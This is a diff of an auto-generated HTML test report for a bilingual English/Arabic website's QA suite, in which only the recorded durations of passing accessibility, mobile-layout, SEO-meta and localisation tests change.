     <span class="trow-name">test_qa07_phone_input_has_label</span>
     
-    <span class="trow-dur">15.58s</span>
+    <span class="trow-dur">15.44s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Phone input in modal must have an associated label or aria-label.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">15.58s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa07_phone_input_has_label</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Phone input in modal must have an associated label or aria-label.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">15.44s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa07_phone_input_has_label</code></span></div>
   </div>
 </details>
 
@@ -9354,10 +9354,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa07_nav_links_have_descriptive_text</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.04s</span>
+    <span class="trow-dur">1.97s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Navigation links must not use ambiguous text like 'click here' or 'more'.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.04s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa07_nav_links_have_descriptive_text</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Navigation links must not use ambiguous text like 'click here' or 'more'.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.97s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa07_nav_links_have_descriptive_text</code></span></div>
   </div>
 </details>
 
@@ -9450,10 +9450,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa08_homepage_renders_at_mobile_375</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.15s</span>
+    <span class="trow-dur">2.08s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must render without horizontal overflow at 375px width.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.15s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_homepage_renders_at_mobile_375</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must render without horizontal overflow at 375px width.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.08s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_homepage_renders_at_mobile_375</code></span></div>
   </div>
 </details>
 
@@ -9462,10 +9462,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa08_homepage_renders_at_tablet_768</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.06s</span>
+    <span class="trow-dur">2.01s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must render without overflow at tablet 768px width.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.06s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_homepage_renders_at_tablet_768</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must render without overflow at tablet 768px width.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.01s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_homepage_renders_at_tablet_768</code></span></div>
   </div>
 </details>
 
@@ -9474,10 +9474,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa08_hamburger_menu_visible_on_mobile</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.06s</span>
+    <span class="trow-dur">2.02s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Hamburger/mobile menu button must be visible at 375px.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.06s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_hamburger_menu_visible_on_mobile</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Hamburger/mobile menu button must be visible at 375px.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.02s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_hamburger_menu_visible_on_mobile</code></span></div>
   </div>
 </details>
 
@@ -9486,10 +9486,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa08_login_modal_usable_on_mobile</span>
     
-    <span class="trow-dur">15.62s</span>
+    <span class="trow-dur">15.60s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Login modal must open and show phone input at 375px.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">15.62s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_login_modal_usable_on_mobile</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Login modal must open and show phone input at 375px.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">15.60s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_login_modal_usable_on_mobile</code></span></div>
   </div>
 </details>
 
@@ -9498,10 +9498,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa08_touch_targets_large_enough</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.06s</span>
+    <span class="trow-dur">1.99s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Interactive elements must be at least 44×44 CSS pixels (WCAG 2.5.5).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.06s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_touch_targets_large_enough</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Interactive elements must be at least 44×44 CSS pixels (WCAG 2.5.5).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.99s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_touch_targets_large_enough</code></span></div>
   </div>
 </details>
 
@@ -9510,10 +9510,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa08_font_size_readable_on_mobile</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.07s</span>
+    <span class="trow-dur">2.00s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Body text font size must be at least 12px on mobile.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.07s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_font_size_readable_on_mobile</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Body text font size must be at least 12px on mobile.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.00s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_font_size_readable_on_mobile</code></span></div>
   </div>
 </details>
 
@@ -9522,10 +9522,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa08_desktop_1280_no_js_errors</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.12s</span>
+    <span class="trow-dur">1.99s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage at 1280×720 desktop must have no JS errors.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.12s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_desktop_1280_no_js_errors</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage at 1280×720 desktop must have no JS errors.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.99s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_desktop_1280_no_js_errors</code></span></div>
   </div>
 </details>
 
@@ -9534,10 +9534,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa08_arabic_rtl_layout_mobile</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.10s</span>
+    <span class="trow-dur">2.01s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Arabic locale must render RTL correctly at 375px mobile.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.10s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_arabic_rtl_layout_mobile</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Arabic locale must render RTL correctly at 375px mobile.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.01s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa08_arabic_rtl_layout_mobile</code></span></div>
   </div>
 </details>
 
@@ -9582,10 +9582,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa09_meta_charset_declared</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.62s</span>
+    <span class="trow-dur">2.34s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">&lt;meta charset&gt; must be UTF-8.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.62s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_meta_charset_declared</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">&lt;meta charset&gt; must be UTF-8.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.34s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_meta_charset_declared</code></span></div>
   </div>
 </details>
 
@@ -9594,10 +9594,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa09_meta_viewport_present</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.54s</span>
+    <span class="trow-dur">2.33s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">&lt;meta name='viewport'&gt; must be present (responsive design).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_meta_viewport_present</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">&lt;meta name='viewport'&gt; must be present (responsive design).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.33s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_meta_viewport_present</code></span></div>
   </div>
 </details>
 
@@ -9606,10 +9606,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa09_meta_description_present</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.57s</span>
+    <span class="trow-dur">2.37s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">&lt;meta name='description'&gt; should be present and non-empty.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.57s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_meta_description_present</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">&lt;meta name='description'&gt; should be present and non-empty.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.37s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_meta_description_present</code></span></div>
   </div>
 </details>
 
@@ -9618,10 +9618,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa09_og_title_present</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.56s</span>
+    <span class="trow-dur">2.34s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Open Graph og:title should be present (social preview).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.56s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_og_title_present</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Open Graph og:title should be present (social preview).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.34s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_og_title_present</code></span></div>
   </div>
 </details>
 
@@ -9630,10 +9630,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa09_no_noindex_on_homepage</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.57s</span>
+    <span class="trow-dur">2.34s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must not be marked noindex (would hide from search engines).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.57s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_no_noindex_on_homepage</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must not be marked noindex (would hide from search engines).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.34s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_no_noindex_on_homepage</code></span></div>
   </div>
 </details>
 
@@ -9642,10 +9642,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa09_favicon_link_present</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.55s</span>
+    <span class="trow-dur">2.32s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">&lt;link rel='icon'&gt; or &lt;link rel='shortcut icon'&gt; must be present.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.55s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_favicon_link_present</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">&lt;link rel='icon'&gt; or &lt;link rel='shortcut icon'&gt; must be present.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.32s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_favicon_link_present</code></span></div>
   </div>
 </details>
 
@@ -9654,10 +9654,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa09_images_have_alt</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">4.10s</span>
+    <span class="trow-dur">3.81s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Visible images should have non-empty alt text (a11y + SEO).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.10s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_images_have_alt</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Visible images should have non-empty alt text (a11y + SEO).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.81s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_images_have_alt</code></span></div>
   </div>
 </details>
 
@@ -9666,10 +9666,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa09_no_broken_internal_links_in_header</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.55s</span>
+    <span class="trow-dur">2.31s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Header nav links must all return 2xx/3xx (no 404 in main nav).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.55s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_no_broken_internal_links_in_header</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Header nav links must all return 2xx/3xx (no 404 in main nav).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.31s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa09_no_broken_internal_links_in_header</code></span></div>
   </div>
 </details>
 
@@ -9726,10 +9726,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa10_arabic_url_loads</span>
     
-    <span class="trow-dur">2.24s</span>
+    <span class="trow-dur">2.59s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">/ar URL must load without redirecting to /en.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.24s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_url_loads</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">/ar URL must load without redirecting to /en.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.59s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_url_loads</code></span></div>
   </div>
 </details>
 
@@ -9738,10 +9738,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa10_arabic_text_present</span>
     
-    <span class="trow-dur">3.65s</span>
+    <span class="trow-dur">4.08s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Page body must contain Arabic-script characters (U+0600..U+06FF).</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.65s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_text_present</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Page body must contain Arabic-script characters (U+0600..U+06FF).</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.08s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_text_present</code></span></div>
   </div>
 </details>
 
@@ -9750,10 +9750,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa10_no_english_strings_in_arabic_body</span>
     
-    <span class="trow-dur">3.67s</span>
+    <span class="trow-dur">4.08s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Main Arabic body content should not be majority-English.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.67s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_no_english_strings_in_arabic_body</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Main Arabic body content should not be majority-English.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.08s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_no_english_strings_in_arabic_body</code></span></div>
   </div>
 </details>
 
@@ -9762,10 +9762,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa10_arabic_no_layout_horizontal_overflow</span>
     
-    <span class="trow-dur">3.63s</span>
+    <span class="trow-dur">4.07s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">RTL page must not have horizontal overflow at desktop 1280×720.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.63s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_no_layout_horizontal_overflow</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">RTL page must not have horizontal overflow at desktop 1280×720.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.07s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_no_layout_horizontal_overflow</code></span></div>
   </div>
 </details>
 
@@ -9774,10 +9774,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa10_arabic_no_console_errors</span>
     
-    <span class="trow-dur">3.65s</span>
+    <span class="trow-dur">4.08s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Loading /ar must not produce JS console errors.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.65s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_no_console_errors</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Loading /ar must not produce JS console errors.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.08s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_no_console_errors</code></span></div>
   </div>
 </details>
 
@@ -9786,10 +9786,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa10_arabic_h1_non_empty</span>
     
-    <span class="trow-dur">3.64s</span>
+    <span class="trow-dur">4.08s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">H1 on /ar must be non-empty (localized headline).</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.64s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_h1_non_empty</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">H1 on /ar must be non-empty (localized headline).</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.08s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa10_arabic_h1_non_empty</code></span></div>
   </div>
 </details>
 
@@ -9990,10 +9990,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa12_no_uncaught_js_errors</span>
     <span class="trow-params">homepage_en, https://dev.prowhats.com/en</span>
-    <span class="trow-dur">5.04s</span>
+    <span class="trow-dur">4.97s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Page must not throw any uncaught JS error after full hydration.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">homepage_en, https://dev.prowhats.com/en</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">5.04s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa12_no_uncaught_js_errors</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Page must not throw any uncaught JS error after full hydration.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">homepage_en, https://dev.prowhats.com/en</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.97s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa12_no_uncaught_js_errors</code></span></div>
   </div>
 </details>
 
@@ -10002,10 +10002,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa12_no_uncaught_js_errors</span>
     <span class="trow-params">homepage_ar, https://dev.prowhats.com/ar</span>
-    <span class="trow-dur">4.96s</span>
+    <span class="trow-dur">4.84s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Page must not throw any uncaught JS error after full hydration.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">homepage_ar, https://dev.prowhats.com/ar</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.96s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa12_no_uncaught_js_errors</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Page must not throw any uncaught JS error after full hydration.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">homepage_ar, https://dev.prowhats.com/ar</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.84s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa12_no_uncaught_js_errors</code></span></div>
   </div>
 </details>
 
@@ -10160,10 +10160,10 @@ CSP frame-ancestors.</span></div><div class="td-row"><span class="td-lbl">Test d
